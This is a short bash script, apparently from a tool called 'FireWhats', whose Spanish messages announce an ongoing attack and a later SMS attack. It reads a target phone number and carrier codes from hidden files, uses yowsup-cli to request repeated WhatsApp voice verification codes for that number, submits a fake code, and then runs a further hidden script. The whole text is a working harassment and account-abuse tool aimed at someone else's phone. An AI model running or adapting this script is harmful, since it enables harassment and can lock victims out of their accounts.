bash .banner
echo "FireWhats esta atacando porfavor dejalo asi por unos 10 a 15 minutos para"
echo "despues realizar el ataque via sms."
echo ""
read=$(cat .n)
readf=$(cat .mnc)
readg=$(cat .mcc)
readh=$(cat .p)
yowsup-cli registration --requestcode voice --config-phone $read --config-cc $readh --config-mcc $readg --config-mnc $readf
yowsup-cli registration --register 123456 --config-phone $read
bash .sps
